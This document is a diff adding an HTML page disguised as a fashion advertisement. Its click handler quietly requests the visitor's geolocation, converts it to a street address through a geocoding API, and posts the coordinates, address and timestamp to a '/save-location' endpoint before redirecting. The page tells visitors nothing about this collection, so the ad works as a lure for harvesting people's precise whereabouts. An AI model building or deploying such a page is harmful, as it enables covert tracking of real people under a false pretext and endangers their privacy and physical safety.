@@ -1,0 +1,85 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Fashion Ad</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background-color: #f0f0f0;
+        }
+        .ad-container {
+            position: relative;
+            width: 100%;
+            max-width: 600px;
+            cursor: pointer;
+        }
+        .ad-container img {
+            width: 100%;
+            height: auto;
+            display: block;
+        }
+        .shop-now-button {
+            position: absolute;
+            bottom: 20px;
+            left: 50%;
+            transform: translateX(-50%);
+            background-color: #ff4081;
+            color: white;
+            padding: 10px 20px;
+            font-size: 16px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            text-decoration: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="ad-container" onclick="logLocation()">
+        <img src="./images/A modern, vibrant advertisement for the latest fashion trends. The image should feature a stylish woman wearing trendy, colorful clothing, set against.webp" alt="Fashion Advertisement">
+        <a href="register-house.html" class="shop-now-button">Shop Now</a>
+    </div>
+
+    <script>
+        function logLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(function (position) {
+                    const lat = position.coords.latitude;
+                    const lng = position.coords.longitude;
+                    const timestamp = new Date().toISOString();
+
+                    fetch(`https://maps.googleapis.com/maps/api/geocode/json?latlng=${lat},${lng}&key=YOUR_GOOGLE_MAPS_API_KEY`)
+                        .then(response => response.json())
+                        .then(data => {
+                            const address = data.results[0]?.formatted_address || "Unknown address";
+
+                            // Send the location, time, and address to the server to save
+                            fetch('/save-location', {
+                                method: 'POST',
+                                headers: {
+                                    'Content-Type': 'application/json'
+                                },
+                                body: JSON.stringify({
+                                    latitude: lat,
+                                    longitude: lng,
+                                    address: address,
+                                    timestamp: timestamp
+                                })
+                            })
+                            .then(() => window.location.href = 'https://yourlandingpage.com')
+                            .catch(error => console.error('Error saving location:', error));
+                        });
+                });
+            }
+        }
+    </script>
+</body>
+</html>
